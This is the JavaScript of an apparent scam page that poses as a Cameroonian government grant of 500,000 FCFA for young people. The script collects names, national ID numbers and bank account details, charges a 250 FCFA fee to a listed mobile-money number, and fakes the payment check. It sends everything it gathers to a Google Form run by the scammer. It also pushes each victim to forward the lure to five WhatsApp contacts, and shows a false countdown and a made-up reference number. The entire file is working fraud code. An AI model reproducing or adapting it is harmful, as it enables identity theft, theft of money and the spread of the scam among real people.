// Configuration - UPDATE THESE WITH YOUR NUMBERS
const CONFIG = {
    orangeMoneyNumber: "6XX XXX XXX", // ← CHANGE THIS TO YOUR ORANGE MONEY NUMBER
    mtnMoneyNumber: "673 272 421",    // ← CHANGE THIS TO YOUR MTN MONEY NUMBER
    whatsappMessage: "Le Gouvernement Camerounais donne 500,000 FCFA aux jeunes. Je viens de faire ma demande. Dépêche-toi avant la fin du quota! 👇 https://js6124669-wq.github.io/subvention-jeunes/",
    googleFormID: "1FAIpQLSeXriGwzmBcHLwVhbE4DFtmnNdiWGFySXcaLuXNi15JldEQ_g" // ← TU VAS METTRE TON ID GOOGLE FORM ICI
};

let currentStep = 1;
let userData = {};

// Initialize the page
function init() {
    updateProgressBar();
    startTimer();
    showStep(1);
}

// Show specific step
function showStep(stepNumber) {
    document.querySelectorAll('.step').forEach(step => {
        step.classList.remove('active');
    });
    document.getElementById(`step${stepNumber}`).classList.add('active');
    currentStep = stepNumber;
    updateProgressBar();
}

// Update progress bar
function updateProgressBar() {
    const progress = (currentStep / 5) * 100;
    document.getElementById('progress').style.width = `${progress}%`;
}

// Timer countdown
function startTimer() {
    let time = 2 * 60 * 60 + 59 * 60 + 59;
    const timerElement = document.getElementById('timer');
    
    const countdown = setInterval(() => {
        const hours = Math.floor(time / 3600);
        const minutes = Math.floor((time % 3600) / 60);
        const seconds = time % 60;
        
        timerElement.textContent = 
            `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (time <= 0) {
            clearInterval(countdown);
            timerElement.textContent = "Temps écoulé!";
            timerElement.style.background = "#ce1126";
        }
        time--;
    }, 1000);
}

// Step 1: Check Eligibility (Always returns true)
function checkEligibility() {
    const phone = document.getElementById('phone').value;
    if (!phone || phone.length < 9) {
        alert("Veuillez entrer un numéro de téléphone valide");
        return;
    }
    
    userData.phone = phone;
    nextStep(1);
}

// Navigate to next step
function nextStep(fromStep) {
    if (fromStep === 2 && !validateStep2()) return;
    if (fromStep === 3 && !validateStep3()) return;
    
    showStep(fromStep + 1);
    
    if (fromStep === 2) savePersonalInfo();
    if (fromStep === 3) saveBankInfo();
}

// Validate Step 2 (Personal Information)
function validateStep2() {
    const requiredFields = ['fullName', 'birthDate', 'nationalId', 'region'];
    for (let field of requiredFields) {
        if (!document.getElementById(field).value) {
            alert("Veuillez remplir tous les champs obligatoires");
            return false;
        }
    }
    return true;
}

// Validate Step 3 (Bank Information)
function validateStep3() {
    const requiredFields = ['bankName', 'accountNumber', 'accountHolder'];
    for (let field of requiredFields) {
        if (!document.getElementById(field).value) {
            alert("Veuillez remplir tous les champs obligatoires");
            return false;
        }
    }
    return true;
}

// Save personal information
function savePersonalInfo() {
    userData.personalInfo = {
        fullName: document.getElementById('fullName').value,
        birthDate: document.getElementById('birthDate').value,
        nationalId: document.getElementById('nationalId').value,
        region: document.getElementById('region').value
    };
    console.log('Personal Info Saved:', userData.personalInfo);
}

// Save bank information
function saveBankInfo() {
    userData.bankInfo = {
        bankName: document.getElementById('bankName').value,
        accountNumber: document.getElementById('accountNumber').value,
        accountHolder: document.getElementById('accountHolder').value
    };
    console.log('Bank Info Saved:', userData.bankInfo);
}

// Step 4: Payment method selection
function selectPayment(method) {
    const instructions = document.getElementById('instructionsText');
    const paymentDiv = document.getElementById('paymentInstructions');
    
    if (method === 'orange') {
        instructions.innerHTML = `Veuillez effectuer le paiement de <strong>250 FCFA</strong> au numéro Orange Money: <strong>${CONFIG.orangeMoneyNumber}</strong>`;
        userData.paymentMethod = 'orange';
    } else {
        instructions.innerHTML = `Veuillez effectuer le paiement de <strong>250 FCFA</strong> au numéro MTN Mobile Money: <strong>${CONFIG.mtnMoneyNumber}</strong>`;
        userData.paymentMethod = 'mtn';
    }
    
    paymentDiv.style.display = 'block';
    userData.paymentMethod = method;
}

// Step 4: Verify payment
function verifyPayment() {
    const transactionCode = document.getElementById('transactionCode').value;
    if (!transactionCode) {
        alert("Veuillez entrer le code de transaction");
        return;
    }
    
    userData.transactionCode = transactionCode;
    
    document.getElementById('step4').innerHTML = `
        <h2>Vérification en cours...</h2>
        <p>Veuillez patienter pendant que nous vérifions votre paiement.</p>
        <div class="loading">⏳</div>
    `;
    
    setTimeout(() => {
        userData.paymentVerified = true;
        userData.paymentTime = new Date().toISOString();
        console.log('Payment Data:', userData);
        
        // ENVOYER LES DONNÉES AU GOOGLE FORM APRÈS PAIEMENT
        sendToGoogleForm(userData);
        
        nextStep(4);
    }, 3000);
}

// Step 5: WhatsApp sharing
function shareOnWhatsApp() {
    const shareText = encodeURIComponent(CONFIG.whatsappMessage);
    const whatsappUrl = `https://wa.me/?text=${shareText}`;
    
    window.open(whatsappUrl, '_blank');
    
    document.getElementById('shareStatus').innerHTML = `
        <p style="color: green; margin-top: 15px;">
        ✅ Merci! Retournez sur WhatsApp pour partager le message avec 5 contacts/groups, puis revenez ici.
        </p>
        <button onclick="completeApplication()" style="background: #25D366;">
        ✅ J'ai partagé, finaliser ma demande
        </button>
    `;
}

// Final completion
function completeApplication() {
    // ENVOYER LES DONNÉES FINALES AU GOOGLE FORM
    sendToGoogleForm(userData, true);
    
    document.getElementById('step5').innerHTML = `
        <div style="text-align: center; padding: 40px 20px;">
            <h2 style="color: #007e3a;">✅ Demande Soumise avec Succès!</h2>
            <p>Votre demande de subvention de 500,000 FCFA a été enregistrée.</p>
            <p><strong>Numéro de référence:</strong> CM-PAIJ-${Date.now()}</p>
            <p>Vous recevrez un SMS de confirmation dans les 24 heures.</p>
            <div style="margin-top: 20px; padding: 15px; background: #f0f8f0; border-radius: 8px;">
                <strong>Prochaine étape:</strong> Votre dossier sera traité sous 48h maximum.
            </div>
        </div>
    `;
}

// FONCTION POUR ENVOYER LES DONNÉES VERS GOOGLE FORM
function sendToGoogleForm(data, isFinal = false) {
    // METS TES VRAIS IDs ICI ↓
    const fieldMapping = {
        "entry.1127196694": data.phone || '',                    // Numéro téléphone
        "entry.1336914721": data.personalInfo?.fullName || '',   // Nom complet
        "entry.401740454": data.personalInfo?.nationalId || '', // Numéro CNI
        "entry.2064465324": data.personalInfo?.region || '',     // Région
        "entry.668103226": data.bankInfo?.bankName || '',       // Banque
        "entry.495506041": data.bankInfo?.accountNumber || '',  // Numéro compte
        "entry.81584951": data.transactionCode || '',          // Code transaction
        "entry.2131029599": isFinal ? 'COMPLETED' : 'PAYMENT',   // Statut
        "entry.2113777428": new Date().toISOString()             // Timestamp
    };
    
    // Construire les données pour l'envoi
    const formData = new URLSearchParams();
    for (const [fieldId, value] of Object.entries(fieldMapping)) {
        formData.append(fieldId, value);
    }
    
    // URL finale (AVEC TON ID)
    const googleFormURL = `https://docs.google.com/forms/d/e/${CONFIG.googleFormID}/formResponse`;
    
    console.log('🔄 Envoi des données...', fieldMapping);
    
    // Envoyer les données
    fetch(googleFormURL, {
        method: "POST",
        body: formData,
        mode: "no-cors"
    }).then(() => {
        console.log('✅ Données envoyées avec succès!');
    }).catch(error => {
        console.error('❌ Erreur:', error);
    });
}

// Initialize the application when page loads
document.addEventListener('DOMContentLoaded', init);